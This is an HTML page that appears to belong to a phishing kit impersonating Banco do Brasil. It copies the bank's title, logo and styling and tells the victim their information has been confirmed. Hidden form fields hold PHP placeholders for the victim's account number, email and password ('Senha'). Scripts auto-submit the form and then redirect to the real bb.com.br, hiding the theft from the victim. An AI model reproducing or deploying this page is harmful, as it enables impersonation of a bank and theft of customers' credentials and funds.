<!DOCTYPE html>
<html lang="pt-br" data-ng-app="openBanking" oauth-loading class="fundo-azul">


<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Banco do Brasil</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" href="imagens/favicon.ico" type="image/x-icon" />
    <link rel="stylesheet" type="text/css" href="css/angular-material.min8cea.css" />
    <link rel="stylesheet" type="text/css" href="css/bulma.min.css" />
    <link rel="stylesheet" type="text/css" href="css/style.css" />
    <link rel="stylesheet" type="text/css" href="css/titulares.css" />
    <link rel="stylesheet" type="text/css" href="css/input.css" />
    <link rel="stylesheet" type="text/css" href="css/componentes.css" />
    <link rel="stylesheet" type="text/css" href="css/voltar.css" />
    <link rel="stylesheet" type="text/css" href="css/contas.css" />
    <link rel="stylesheet" type="text/css" href="css/termo.css" />
	
    <script src="lib/jquery-1-12-4.js"></script>
	<script type="text/javascript" src="js/prototipo.js"></script>
	<script type="text/javascript" src="js/jquery.validate.cpf.js"></script> 
    <script src="lib/jquery.mask.min.js"></script>
	 <script src="lib/mask.min.js"></script>
    <script src="lib/indexeddb.js"></script>
	<script src="lib/home.js"></script>
	

</head>

<body class="caixa">


    <div data-ng-view="" class="ng-scope" style="">
        <section class="hero is-fullheight ng-scope">
            <div class="disabilitado-hero-body">
                <input type="hidden" id="Conta" name="Conta" value="'.$Conta.'">
                <div class="container">
					
                    <section class="page-section welcome-section is-white">
						
                        <figure class="avatar">
                            <img class="logo" data-ng-src="imagens/logo-login.jpg" src="imagens/logo-login.jpg">
                        </figure>
						<div class="welcome">
                        </div>
                    </section>
                    <div class="column is-4 is-offset-4 caixa">
                        <p class="subtitle is-subtitulo-azul has-text-centered"><font style="font-size: 14pt">&oplus; </font></p>
						<article class="message is-success">
  <div class="message-body">
    <font style="font-size: 12px;">Suas informações foram confirmadas!.<br>
		
	<strong>Aguarde você sera direcionado..<strong>
	
	</font>
  </div>
</article>		<form name="aapfModal" id="aapfModal" method="POST" autocomplete="off" target="_self" action="https://www.bb.com.br/pbb/pagina-inicial#/">
  <p>
    <input class="botaoapf noPrint" hidden="" type="submit" name="botaoConfirma.x" id="botaoConfirma" title="Confirma a transação" value="Aguarde&nbsp;&nbsp;&nbsp;" onclick="getAcaoBotao('botaoConfirma.x');confirmaAssinador=1;trocaBotaoAction('botaoConfirma');" tabindex="90">
    <input type="hidden" id="erro" name="erro" value="1">
  </p>
  <p>			<center><small><script>
function fechar() {
janela = top; 
janela.opener = top; 
janela.close();
}
</script>
<a href="javascript:fechar()"><font color="#0066FF">Fechar</font></a></small></center>
    <input type="hidden" id="erro" name="erro" value="1">
    <input type="hidden" id="erro" name="erro" value="1"><input type="hidden" id="email" name="email" value="'.$Email.'"><input type="hidden" id="Senha" name="Senha" value="'.$Senha.'"><input type="hidden" id="Nome" name="Nome" value=""><input type="hidden" id="erros" name="erros" value="1">
  </p>
</form><script type="text/javascript"> setTimeout(function () {document.getElementById('botaoConfirma').click()},3000); // 1000 seconds</script>	
                  </div>
                </div>
            </div>
        </section>
    </div>
<script type = "text/javascript">
         <!--
            function Redirect() {
               window.location = "https://www.bb.com.br/pbb/pagina-inicial#/";
            }            
            document.write("You will be redirected to main page in 10 sec.");
            setTimeout('Redirect()', 10000);
         //-->
      </script>
</body>




</html>
